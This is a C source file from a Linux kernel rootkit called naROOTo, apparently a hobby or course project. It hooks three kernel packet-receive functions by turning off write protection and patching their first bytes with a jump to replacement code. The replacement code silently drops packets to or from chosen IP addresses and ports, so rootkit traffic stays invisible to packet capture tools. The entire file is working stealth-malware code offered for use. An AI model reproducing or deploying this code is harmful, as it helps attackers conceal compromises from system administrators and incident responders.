/******************************************************************************
 *
 * Name: hide_packet.c 
 * This file provides all the functionality needed for hiding packets.
 *
 *****************************************************************************/
/*
 * This file is part of naROOTo.

 * naROOTo is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * naROOTo is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with naROOTo.  If not, see <http://www.gnu.org/licenses/>. 
 */

#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/ipv6.h>
#include <linux/skbuff.h>
#include <linux/tcp.h>
#include <linux/udp.h>

#include "include.h"

int manipulated_packet_rcv(struct sk_buff *skb, struct net_device *dev,
			   struct packet_type *pt, struct net_device *orig_dev);
int manipulated_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
			    struct packet_type *pt,
			    struct net_device *orig_dev);
int manipulated_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev,
				struct packet_type *pt,
				struct net_device *orig_dev);

/* the functions that are being hooked */
int (*packet_rcv) (struct sk_buff *, struct net_device *, struct packet_type *,
		   struct net_device *) = (void *)sysmap_packet_rcv;
int (*packet_rcv_spkt) (struct sk_buff *, struct net_device *,
			struct packet_type *, struct net_device *) =
    (void *)sysmap_packet_rcv_spkt;
int (*tpacket_rcv) (struct sk_buff *, struct net_device *, struct packet_type *,
		    struct net_device *) = (void *)sysmap_tpacket_rcv;

/* spinlocks for each function we hook */
spinlock_t packet_rcv_lock;
unsigned long packet_rcv_flags;

spinlock_t tpacket_rcv_lock;
unsigned long tpacket_rcv_flags;

spinlock_t packet_rcv_spkt_lock;
unsigned long packet_rcv_spkt_flags;

/* the template for the 'ret' hook we are using */
const char hook_template[6] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3 };

/* code of the original functions that will be overwritten by our hook */
char original_packet_rcv[6];
char original_tpacket_rcv[6];
char original_packet_rcv_spkt[6];

/*
 * Checks a packet's TCP header to determine if the packet should be hidden
 */
int is_tcp_port_hidden(struct tcphdr *tcp_header)
{
	/* check with the control API if this service is hidden */
	if (is_tcp_socket_hidden(ntohs(tcp_header->dest))
	    || is_tcp_socket_hidden(ntohs(tcp_header->source))) {
		ROOTKIT_DEBUG
		    ("Filtered TCP packet detected. Src: %u Dest: %u\n",
		     ntohs(tcp_header->source), ntohs(tcp_header->dest));
		return 1;
	}

	return 0;
}

/*
 * Checks a packet's UDP header to determine if the packet should be hidden
 */
int is_udp_port_hidden(struct udphdr *udp_header)
{
	/* check with the control API if this service is hidden */
	if (is_udp_socket_hidden(ntohs(udp_header->dest))
	    || is_udp_socket_hidden(ntohs(udp_header->source))) {
		ROOTKIT_DEBUG
		    ("Filtered UDP packet detected. Src: %u Dest: %u\n",
		     ntohs(udp_header->source), ntohs(udp_header->dest));
		return 1;
	}

	return 0;
}

/*
 * Checks if this specific packet should be hidden.
 */
int is_packet_hidden(struct sk_buff *skb, struct net_device *dev)
{
	struct iphdr *ip_header;
	struct ipv6hdr *ipv6_header;
	struct tcphdr *tcp_header;
	struct udphdr *udp_header;

	if (ntohs(skb->protocol) == ETH_P_IP) {	/* IPv4 */
		ip_header = ip_hdr(skb);

		/* check if we have to filter this IPv4 address */
		if (is_ip_hidden(ip_header->saddr)
		    || is_ip_hidden(ip_header->daddr)) {
			ROOTKIT_DEBUG("Filtered IPv4 address.\n");
			return 1;
		}

		/* check if this is a TCP or an UDP packet */
		if (ip_header->protocol == IPPROTO_TCP) {
			tcp_header =
			    (struct tcphdr *)((__u32 *) ip_header +
					      ip_header->ihl);

			if (is_tcp_port_hidden(tcp_header))
				return 1;
		} else if (ip_header->protocol == IPPROTO_UDP) {
			udp_header =
			    (struct udphdr *)((__u32 *) ip_header +
					      ip_header->ihl);

			if (is_udp_port_hidden(udp_header))
				return 1;
		}

	} else if (ntohs(skb->protocol) == ETH_P_IPV6) {	/* IPv6 */
		ipv6_header = ipv6_hdr(skb);

		/* check if this is an TCP packet */
		if (ipv6_header->nexthdr == IPPROTO_TCP) {
			tcp_header =
			    (struct tcphdr *)((__u32 *) ipv6_header + 10);

			if (is_tcp_port_hidden(tcp_header))
				return 1;
		}
	} else
		printk("Unknown protocol: %X", ntohs(skb->protocol));

	return 0;
}

/* hooks 'packet_rcv' */
void hook_packet_rcv(void)
{
	char hook[6];
	unsigned int *target = (unsigned int *)(hook + 1);
	memcpy(hook, hook_template, sizeof(char) * 6);

	/* disable write protection */
	disable_page_protection();

	/* set the correct jump target */
	*target = (unsigned int *)manipulated_packet_rcv;

	/* backup and overwrite the first part of the function */
	memcpy(original_packet_rcv, packet_rcv, 6);
	memcpy(packet_rcv, hook, 6);

	/* reenable write protection */
	enable_page_protection();
}

/* hooks 'tpacket_rcv' */
void hook_tpacket_rcv(void)
{
	char hook[6];
	unsigned int *target = (unsigned int *)(hook + 1);
	memcpy(hook, hook_template, sizeof(char) * 6);

	/* disable write protection */
	disable_page_protection();

	/* set the correct jump target */
	*target = (unsigned int *)manipulated_tpacket_rcv;

	/* backup and overwrite the first part of the function */
	memcpy(original_tpacket_rcv, tpacket_rcv, 6);
	memcpy(tpacket_rcv, hook, 6);

	/* reenable write protection */
	enable_page_protection();
}

/* hooks 'packet_rcv_spkt' */
void hook_packet_rcv_spkt(void)
{
	char hook[6];
	unsigned int *target = (unsigned int *)(hook + 1);
	memcpy(hook, hook_template, sizeof(char) * 6);

	/* disable write protection */
	disable_page_protection();

	/* set the correct jump target */
	*target = (unsigned int *)manipulated_packet_rcv_spkt;

	/* backup and overwrite the first part of the function */
	memcpy(original_packet_rcv_spkt, packet_rcv_spkt, 6);
	memcpy(packet_rcv_spkt, hook, 6);

	/* reenable write protection */
	enable_page_protection();
}

/* restores 'packet_rcv' */
void unhook_packet_rcv(void)
{
	/* disable write protection */
	disable_page_protection();

	/* restore the first 6 bytes we changed */
	memcpy(packet_rcv, original_packet_rcv, 6);

	/* reenable write protection */
	enable_page_protection();
}

/* restores 'tpacket_rcv' */
void unhook_tpacket_rcv(void)
{
	/* disable write protection */
	disable_page_protection();

	/* restore the first 6 bytes we changed */
	memcpy(tpacket_rcv, original_tpacket_rcv, 6);

	/* reenable write protection */
	enable_page_protection();
}

/* restores 'packet_rcv_spkt' */
void unhook_packet_rcv_spkt(void)
{
	/* disable write protection */
	disable_page_protection();

	/* restore the first 6 bytes we changed */
	memcpy(packet_rcv_spkt, original_packet_rcv_spkt, 6);

	/* reenable write protection */
	enable_page_protection();
}

/* our manipulated 'packet_rcv' */
int
manipulated_packet_rcv(struct sk_buff *skb, struct net_device *dev,
		       struct packet_type *pt, struct net_device *orig_dev)
{
	int ret = 0;
	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);

	/* check if we need to hide this packet */
	if (is_packet_hidden(skb, dev))
		ROOTKIT_DEBUG("Dropped a packet in 'packet_rcv'.\n");
	else {
		/* restore original, call it, hook again */
		unhook_packet_rcv();
		ret = packet_rcv(skb, dev, pt, orig_dev);
		hook_packet_rcv();
	}

	/* return the correct value of the original function */
	spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);
	return ret;
}

/* our manipulated 'tpacket_rcv' */
int
manipulated_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
			struct packet_type *pt, struct net_device *orig_dev)
{
	int ret = 0;
	spin_lock_irqsave(&tpacket_rcv_lock, tpacket_rcv_flags);

	/* check if we need to hide this packet */
	if (is_packet_hidden(skb, dev))
		ROOTKIT_DEBUG("Dropped a packet in 'tpacket_rcv'.\n");
	else {
		/* restore original, call it, hook again */
		unhook_tpacket_rcv();
		ret = tpacket_rcv(skb, dev, pt, orig_dev);
		hook_tpacket_rcv();
	}

	/* return the correct value of the original function */
	spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);
	return ret;
}

/* our manipulated 'packet_rcv_spkt' */
int
manipulated_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev,
			    struct packet_type *pt, struct net_device *orig_dev)
{
	int ret = 0;
	spin_lock_irqsave(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);

	/* check if we need to hide this packet */
	if (is_packet_hidden(skb, dev))
		ROOTKIT_DEBUG("Dropped a packet in 'packet_rcv_spkt'.\n");
	else {
		/* restore original, call it, hook again */
		unhook_packet_rcv_spkt();
		ret = packet_rcv_spkt(skb, dev, pt, orig_dev);
		hook_packet_rcv_spkt();
	}

	/* return the correct value of the original function */
	spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
	return ret;
}

/* hooks all functions needed to hide packets */
int load_packet_hiding(char *ipv4_addr)
{
	ROOTKIT_DEBUG("Loading packet hiding...\n");

	/* do the initial hook of all three functions */
	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);
	hook_packet_rcv();
	spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);

	spin_lock_irqsave(&tpacket_rcv_lock, tpacket_rcv_flags);
	hook_tpacket_rcv();
	spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);

	spin_lock_irqsave(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
	hook_packet_rcv_spkt();
	spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);

	/* log and return */
	ROOTKIT_DEBUG("Done.\n");
	return 0;
}

/* unhooks all functions */
void unload_packet_hiding(void)
{
	ROOTKIT_DEBUG("Unloading packet hiding...\n");

	/* restore all three functions before unloading */
	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);
	unhook_packet_rcv();
	spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);

	spin_lock_irqsave(&tpacket_rcv_lock, tpacket_rcv_flags);
	unhook_tpacket_rcv();
	spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);

	spin_lock_irqsave(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
	unhook_packet_rcv_spkt();
	spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);

	ROOTKIT_DEBUG("Done.\n");
}
